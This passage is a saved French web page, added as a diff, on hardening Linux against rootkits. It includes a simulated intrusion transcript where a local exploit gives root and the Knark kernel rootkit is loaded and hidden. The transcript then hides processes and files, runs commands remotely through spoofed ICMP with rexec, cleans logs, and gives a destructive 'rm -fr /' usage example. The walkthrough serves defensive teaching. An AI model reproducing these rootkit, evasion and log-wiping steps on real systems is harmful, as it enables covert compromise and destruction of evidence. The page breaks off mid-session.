@@ -1,0 +1,1322 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0051)http://www.isecurelabs.com/faq/seculinuxsauron.html -->
+<HTML><HEAD><TITLE>Linux et sa sécurité</TITLE>
+<META content="text/html; charset=windows-1252" http-equiv=Content-Type>
+<META content="MSHTML 5.00.2920.0" name=GENERATOR></HEAD>
+<BODY aLink=#ff0000 bgColor=#333333 link=#33ccff text=#ffffff vLink=#ffcc00>
+<P align=center>
+<CENTER><B><TT><U><FONT face="Courier New" size=2>Linux et la sécurité : Retirer 
+les failles et se proteger des outils des pirates :</FONT></U></TT></B></CENTER>
+<P><FONT face=Verdana size=2>La sécurité sous linux est une bien large affaire. 
+Dans cette article nous allons voir comment se proteger de ses 
+simple-utilisateur ainsi que des hackers, et comment parer leur outils en cas de 
+compromission au level root. Nous aborderons une notion fondamentale et pourtant 
+peu connu de la sécurité sous linux, qui est l'utilisation de modules. Nous 
+allons voir comment un simple-utilisateur pourrait prendre le contrôle total de 
+votre machine, en passant root puis en implémentant les nouvelles rootkit dont 
+l'on entend beaucoup parler en ce moment comme Adore ou Knark. J'expliquerai 
+comment à notre tour tirer profit de la puissance des modules en implémentant 
+des techniques qui rendront vaine toutes tentatives de rootkitage du 
+système.</FONT>
+<P><FONT face=Verdana size=2>&nbsp;&nbsp;&nbsp;<FONT color=#33ccff>&nbsp; 
+[-&nbsp; Note -]</FONT> <BR>&nbsp;&nbsp;&nbsp; Une rootkit est un outils dont 
+disposent les pirates pour se cacher au sein de votre système une 
+fois<BR>&nbsp;&nbsp;&nbsp; compromis et pouvoir effectuer les actions qu'ils 
+veulent de manière discrète. La rootkit contient&nbsp;<BR>&nbsp;&nbsp;&nbsp; 
+souvent une backdoor ( porte arrière pour revenir sur le système permettant aux 
+intrus de revenir).<BR>&nbsp;&nbsp;&nbsp; Actuellement il existe deux types de 
+rootkit : <BR>&nbsp;&nbsp;&nbsp; "l'ancienne génération ", qui remplace des 
+binaires du systèmes pour cacher l'activité de votre 
+pirate.<BR>&nbsp;&nbsp;&nbsp; Elles modifient généralement ps, ls, netstat, du , 
+find, etc. par des binaires reprogrammes qui&nbsp;<BR>&nbsp;&nbsp;&nbsp; 
+n'affichent pas certains fichiers, certain processus ou certaine connexion. Puis 
+il y a les rootkits de&nbsp;<BR>&nbsp;&nbsp;&nbsp; la&nbsp;nouvelles génération. 
+Ce sont des modules destiner à être charger par le kernel linux. 
+La&nbsp;<BR>&nbsp;&nbsp;&nbsp; puissance&nbsp;des modules lorsqu'elle est au 
+profit des pirate aboutit a des désastres pour les&nbsp;<BR>&nbsp;&nbsp;&nbsp; 
+administrateurs :&nbsp;alors qu'ils ne se passent absolument rien d'anormal sur 
+leur système (à première&nbsp;<BR>&nbsp;&nbsp;&nbsp; vue), celui ci 
+est&nbsp;sous le contrôle total d'intrus.</FONT>
+<P><FONT face=Verdana size=2>Linux est&nbsp; une plate-forme ou il est possible 
+d'atteindre un très haut niveau de sécurité facilement, simplement en 
+configurant sa machine correctement. Il n'y a pas beaucoup de types de failles 
+sous linux, mais celle ci se retrouvent dans un très grand nombre 
+d'applications. Si l'une d'elle est lancée avec un uid 0, alors il est&nbsp; 
+possible pour un intrus de pénétrer votre système en détournant ce programme de 
+sa fonction originale et en lui faisant passer des commandes. Elles sont dû a 
+des négligences de la part des programmeurs, qui ont utiliser des fonctions 
+connues comme créant des vulnérabilités. Nous avons déjà vu quelles sont ces 
+failles dans la série d'article "<A 
+href="http://www-rocq.inria.fr/~raynal/LinuxMag/SecProg/index.html">Éviter les 
+failles de sécurité dès le développement d'une application</A>" de Frederic 
+Raynal, Christian Blaess et Christophe Grenier. Il s'agit généralement de 
+problèmes liés au fait que certaines fonctions vont permettrent aux utilisateurs 
+d'écrire en mémoire, ou même d'y lire. Ainsi un pirate peut réécrire en mémoire 
+des commandes à passer et les faire exécuter par ce&nbsp; programmes, profitant 
+de ses droits/privilèges. Il vous est possible d'éliminer les risques de 
+compromissions dû aux buffer overflow (qui permettent d'écrire en mémoire 
+au-delà des limites du buffer alloué pour&nbsp; la saisie de donnée provenant de 
+l'utilisateur) ou aux bugs de format en installant un patch empêchant d'exécuter 
+du code dans la pile (c'est la que les pirates insèrent le code à exécuter lors 
+de l'exploitation). Parmi les outils les plus utilisés pour prévenir ce genre 
+d'attaque on trouve <A 
+href="http://www.avayalabs.com/project/libsafe/index.html">LibSafe</A> qui un 
+wrapper software qui intercepte les appels de fonctions connus pour être 
+vulnérables aux librairies standards puis y substitue une version correspondante 
+qui va vérifier qu'aucun buffer overflow ne se cache dans la pile et donc 
+empêcher toute tentative d'écriture ou de détournement d'un programme. Il existe 
+agelement des patchs tels que StackGuard qui va protéger l'adresse de retour de 
+pile ou FormatGuard qui va vérifier si le nombre d'argument passé à une fonction 
+printf() correspond aux directives %, ces 2 projets étant intégrés au projet <A 
+href="http://www.immunix.org/">Immunix</A>.</FONT>
+<P><FONT face=Verdana size=2>Afin de se protéger, il faut savoir comment les 
+pirates vont procéder. La quasi-totalité des pirates vont se contenter d'aller 
+chercher les exploits (programmes permettant l'exploitation des failles) et de 
+les lancer à l'attaque de vos machines. Si vous possédez une machine inutilisée, 
+je vous conseille de faire de même par exemple pour vous renseigner sur le 
+comportement et la culture de l'intrus ou si vous avez de meilleures compétences 
+pour développer une signature pour un IDS (Intrusion Detection System) tel que 
+<A href="http://www.snort.org/">Snort</A> ou encore un test d'attaque pour le 
+scanner de vulnérabilité <A href="http://www.nessus.org/">Nessus</A>. Allez sur 
+<A href="http://hack.co.za/">hack.co.za</A> ou sur <A 
+href="http://darknet.hack.be/">darknet.hack.be</A> et aller regarder dans la 
+liste d'exploit correspondant à votre os. Vous détenez maintenant les mêmes 
+armes que vos ennemis. Les exploits se classent en 2 partie : les exploits en 
+remote et ceux en local.</FONT> 
+<P><FONT face=Verdana size=2><FONT color=#33ccff>[-</FONT> Retirer les failles 
+<FONT color=#33ccff>-]</FONT> </FONT>
+<P><FONT face=Verdana size=2>Ceux en local exploitent des failles contenues dans 
+des binaires suid root sur votre système, il vous suffit de changer la 
+permission avec :<FONT color=#33ccff> chmod -s binaire</FONT>.&nbsp;<BR>Pour les 
+exploits en remote, la meilleure chose est de désactiver le service (éditez 
+/etc/inetd.conf , mettez le service vulnérable en commentaire par un # devant et 
+relancez inetd par un <FONT color=#33ccff>kill -HUP</FONT>, ou bien killez le 
+processus vulnérable et retirez le de /etc/rc.d/rcX.d/ ou X est le runlevel dans 
+lequel vous démarrez). Il vous suffit de venir voir de temps à autre si il 
+n'existe pas une nouvel exploit contre votre os. Après avoir fait cela pour 
+chacune des failles, vos risques d'intrusion sont de 95% réduit ou du moins 
+allié à une configuration firewall minimale votre système est il a l'abri des 
+simples script kiddies. Bien souvent il existe des faille au sein même des 
+processus lancés par default au démarrage, c'est par ce biais que le vers ramen 
+se propagea sur les machine linux Red Hat 6.2 et 7.0 en exploitant une faille 
+dans le daemon<FONT color=#33ccff> lpd</FONT>, ainsi que dans le daemon ftp. Si 
+il ne vous est pas possible de retirer le service vulnérable, tentez de 
+l'updater. Je vous conseille d'installer l'un des patchs de de protéction de 
+pile cités plus haut. Ce type de&nbsp; patch vont extrêmement compliquer 
+l'exploitation de buffer overflow en empêchant le code destinée à ouvrir un 
+shell de s'exécuter. De nombreux patch kernel existe qui <BR>s'occupe de patcher 
+ces failles. La modification de sys_symlink ou plus directement du kernel peut 
+également être une bonne chose - si vous en avez les compétences, que vous savez 
+ce que vous faites - pour empêcher les utilisateurs de faire des liens vers des 
+fichiers dont il n'ont pas les droits. Ces patchs proposent une foule d'actions 
+intéressante, généralement destiner à rendre ardue une intrusion dans le système 
+au level root et surtout à protéger certains fichiers ou processus même de son 
+propre admin. Nous verrons plus loin comment installer un de ces patch (<FONT 
+color=#33ccff><A href="http://www.lids.org/">LIDS</A></FONT>) qui implémente la 
+protection et/ou la dissimulation de fichiers et processus ainsi que d'autres 
+petites choses utiles comme un contrôle d'accès (ACL) ou la détection de port 
+scan puis nous jugerons de son efficacité.</FONT> 
+<P><FONT face=Verdana size=2>Maintenant, nous allons voir que fera un pirate sur 
+votre système, les outils dont il dispose et comment le repérer. Je vais donc 
+maintenant simuler ce que ferait un pirate et nous allons ensuite voir comment 
+parer une à une ses méthodes. <BR>Ici je simule un "rootage" en local , mais la 
+manière n'a pas d'importance. Je vais installer une rootkit sur le système et 
+présenter quelques une des actions qu'il est possible de réaliser.</FONT> 
+<P><FONT face=Verdana size=2><FONT color=#33ccff>[-</FONT> Simulation d'une 
+intrusion <FONT color=#33ccff>-]</FONT></FONT> 
+<P><FONT face="Courier New" size=2>[sauron@localhost sauron]$ ./epcs2 <BR>bug 
+exploited successfully. <BR>enjoy! <BR>sh-2.04# whoami <BR>root <BR>sh-2.04# ls 
+-F <BR><FONT color=#3366ff>knark-0.59/</FONT>&nbsp; knark-0.59.tar.gz<FONT 
+color=#33cc00>cleanlog.sh</FONT><FONT color=#ffffff>*</FONT> <BR>sh-2.04# cd 
+knark-0.59 <BR><TT>sh-2.04# 
+make&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# installation de la rootkit knark.</TT> <BR>(...) <BR>sh-2.04# ls 
+<BR>Makefile&nbsp; README&nbsp; <FONT color=#33cc00>ered</FONT><FONT 
+color=#ffffff>*</FONT><FONT color=#33cc00> hidef</FONT><FONT 
+color=#ffffff>*</FONT>&nbsp; knark.o modhide.o&nbsp;<FONT color=#33cc00> 
+nethide</FONT><FONT color=#ffffff>*</FONT>&nbsp; <FONT 
+color=#33cc00>rexec</FONT><FONT color=#ffffff>*</FONT><FONT 
+color=#33cc00>rootme</FONT><FONT color=#ffffff>*</FONT><FONT 
+color=#3366ff>src/</FONT> <BR>sh-2.04# PATH=$PATH:/sbin:/usr/sbin <BR>sh-2<FONT 
+color=#ffffff>.04# insmod knark.o &amp;&amp; insmod modhide.o 2&amp;&gt;1 # Ici 
+je charge le module de la rootkit et je le cache grace a un seconde 
+module.</FONT> <BR><FONT color=#ffffff>sh-2.04# 
+lsmod&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# On s'apercoit ici que la commande lsmod ne laisse pas apparaitre le</FONT> 
+<BR><FONT 
+color=#ffffff>Module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Size&nbsp; Used 
+by&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # module 
+pourtant charger.</FONT> <BR><FONT 
+color=#ffffff>bsd_comp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+4080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; (autoclean)</FONT> 
+<BR><TT><FONT 
+color=#ffffff>ppp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+20976&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; (autoclean) [ppp_deflate 
+bsd_comp]</FONT></TT> <BR><FONT 
+color=#ffffff>slhc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+4544&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; (autoclean) 
+[ppp]</FONT> <BR><FONT 
+color=#ffffff>es1371&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+24656&nbsp;&nbsp;&nbsp;&nbsp; 0</FONT> <BR><FONT 
+color=#ffffff>nls_cp437&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+3952&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp; (autoclean)</FONT> 
+<BR><FONT 
+color=#ffffff>ide-scsi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+7664&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</FONT> <BR><FONT color=#ffffff>sh-2.04# cat 
+/proc/modules&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Le module knark n'apparait pas non plus dans /proc/modules.</FONT> <BR><FONT 
+color=#ffffff>Module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Size&nbsp; Used by</FONT> <BR><FONT 
+color=#ffffff>bsd_comp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+4080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; (autoclean)</FONT> 
+<BR><FONT 
+color=#ffffff>ppp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+20976&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; (autoclean) [ppp_deflate 
+bsd_comp]</FONT> <BR><FONT 
+color=#ffffff>slhc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+4544&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; (autoclean) 
+[ppp]</FONT> <BR><FONT 
+color=#ffffff>es1371&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+24656&nbsp;&nbsp;&nbsp;&nbsp; 0</FONT> <BR><FONT 
+color=#ffffff>nls_cp437&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+3952&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp; (autoclean)</FONT> 
+<BR><FONT 
+color=#ffffff>ide-scsi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+7664&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</FONT> <BR><FONT color=#ffffff>sh-2.04# 
+cat&nbsp; &gt; test-redirection.sh &lt;&lt; EOF&nbsp;&nbsp; # Le rootkit 
+enbarque un outils qui permet de rediriger l'execution de programme.</FONT> 
+<BR><FONT color=#ffffff>&gt; 
+#!/bin/sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Ainsi sans modifier le binaire on peut faire executer un autre programme 
+lorsque</FONT> <BR><FONT color=#ffffff>&gt; echo salut 
+!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# celui ci est appeler. Ici je vais le test avec /bin/ps que je redirige vers un 
+script shell.</FONT> <BR><FONT color=#ffffff>&gt; 
+EOF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Les anciennes rootkit comme t0rn trojanisaient les binaires du systeme, 
+c'est</FONT> <BR><FONT color=#ffffff>sh-2.04# ./ered /bin/ps 
+test-redirection.sh&nbsp; # pourquoi des outils comme tripwire prennent des 
+empreinte de ces binaires afin de les</FONT> <BR><FONT color=#ffffff>sh-2.04# 
+ps&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# detecter lors de comparaison si ils sont detecter. Avec les rootkits par 
+modules, ce types</FONT> <BR><FONT color=#ffffff>salut 
+!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# d'outils devient inutile. Cependant il peut etre bon de laisser tripwire dans 
+votre cron.</FONT> <BR><FONT color=#ffffff>sh-2.04# ./ered 
+-c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Ici le message salut ! prouve que l'execution de ps a ete rediriger.</FONT> 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Heuresement avec ./ered -c on retire toutes les redirections en executions. 
+<BR><FONT color=#ffffff>&nbsp;ered.c by Creed @ #hack.se 1999 
+&lt;creed@sekure.net&gt;</FONT></FONT> 
+<P><FONT face="Courier New" size=2><FONT color=#ffffff>Done. Redirect list is 
+cleared.</FONT> <BR><FONT color=#ffffff>sh-2.04# echo sleep 100 &gt;&gt; 
+test-ps.sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Nous allons 
+maintenant essayer de nos processus.</FONT> <BR><FONT color=#ffffff>sh-2.04# sh 
+test-ps.sh &amp;</FONT> <BR><TT><FONT color=#ffffff>sh-2.04# ps</FONT></TT> 
+<BR><FONT color=#ffffff>&nbsp; PID 
+TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TIME CMD</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2396 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 bash</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2410 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 su</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2499 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 sh</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2540 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 sh</FONT> 
+<BR><TT><FONT color=#ffffff>&nbsp;2541 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 
+sleep&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Notre programme apparait. Le pid 2541 lui a ete attribuer.</FONT></TT> 
+<BR><FONT color=#ffffff>&nbsp;2545 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 ps</FONT> 
+<BR><FONT color=#ffffff>sh-2.04# kill -31 
+2541&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# A l'envoit d'un signal 31 le processus va devenir invisible grace au 
+module.</FONT> <BR><FONT color=#ffffff>sh-2.04# ps</FONT> <BR><FONT 
+color=#ffffff>&nbsp; PID 
+TTY&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TIME CMD</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2396 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 bash</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2410 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 su</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2499 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 sh</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2540 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 sh</FONT> 
+<BR><FONT color=#ffffff>&nbsp;2546 pts/0&nbsp;&nbsp;&nbsp; 00:00:00 
+ps&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# En effet il n'apparait plus.</FONT> <BR><FONT color=#ffffff>sh-2.04# kill 
+2541</FONT> <BR><FONT color=#ffffff>[1]+&nbsp; 
+Terminated&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+sh test-ps.sh</FONT> <BR>sh-2.04# 
+./rexec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Une autre option effrayante est l'execution a distance via des host spoofez 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# a travers les trames ICMP echo reply ( ping ) ! Cela permet d'executer des 
+<BR>&nbsp;rexec.c by Creed @ #hack.se 1999 
+&lt;creed@sekure.net&gt;&nbsp;&nbsp;&nbsp; # en root a distance sur votre 
+systeme sans etre logez et en passant le firewall !!</FONT> 
+<P><FONT face="Courier New" size=2>Usage: <BR>&nbsp;./rexec &lt;src_addr&gt; 
+&lt;dst_addr&gt; &lt;command&gt; [args ...] <BR>ex: ./rexec www.microsoft.com 
+192.168.1.77 /bin/rm -fr / <BR>sh-2.04# ./rexec localhost localhost touch 
+/tmp/Blah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Essayons de passer une commande...</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;rexec.c by Creed @ #hack.se 1999 
+&lt;creed@sekure.net&gt;</FONT> 
+<P><FONT face="Courier New" size=2>Done. exec "touch /tmp/Blah" requested on 
+localhost from localhost <BR>sh-2.04# ls -lga /tmp | grep 
+Blah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Tres efficasses et surtout imparable ! <BR>-rw-r--r--&nbsp;&nbsp;&nbsp; 1 
+root&nbsp;&nbsp;&nbsp;&nbsp; 
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 
+Jun&nbsp; 7 01:40 Blah <BR><FONT color=#ffffff>sh-2.04# pwd</FONT> <BR><FONT 
+color=#ffffff>/home/sauron/knark-0.59</FONT> <BR><FONT color=#ffffff>sh-2.04# 
+./hidef 
+`pwd`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# hidef propose de cacher fichier et repertoire.</FONT> <BR><FONT 
+color=#ffffff>sh-2.04# cd ..</FONT> <BR><FONT color=#ffffff>sh-2.04# ls</FONT> 
+<BR><FONT color=#ffffff>knark-0.59.tar.gz&nbsp; </FONT><FONT 
+color=#33cc00>cleanlog.sh</FONT><FONT 
+color=#ffffff>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# En effet le repertoire n'apparait pas.</FONT> <BR><FONT color=#ffffff>sh-2.04# 
+rmmod knark</FONT> <BR>rmmod: module knark is not loaded<FONT 
+color=#ffffff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Le module ne peut pas etre retirer !</FONT> <BR>sh-2.04# sh cleanlog.sh 
+&lt;hostname_domainam_ipHacker&gt; 2&amp;&gt;1 &amp;&nbsp; # Pour achever le 
+pirate enleve les traces de sa visite. <BR>sh-2.04# sh .lastlogcleaner.sh -user 
+sauron&nbsp; 
+&amp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
